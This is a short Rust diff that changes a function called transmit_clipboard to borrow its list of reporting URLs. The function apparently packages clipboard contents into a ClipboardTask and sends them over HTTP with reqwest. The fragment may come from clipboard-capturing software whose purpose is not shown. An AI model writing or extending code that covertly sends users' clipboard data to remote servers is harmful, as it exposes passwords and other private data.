@@ -6,7 +6,7 @@ pub struct ClipboardTask {
     pub sender: String,
 }
 
-pub fn transmit_clipboard(clipboard_contents: String, reporting_urls: Vec<String>) {
+pub fn transmit_clipboard(clipboard_contents: String, reporting_urls: &Vec<String>) {
     let client = reqwest::blocking::Client::new();
 
     let task = ClipboardTask {
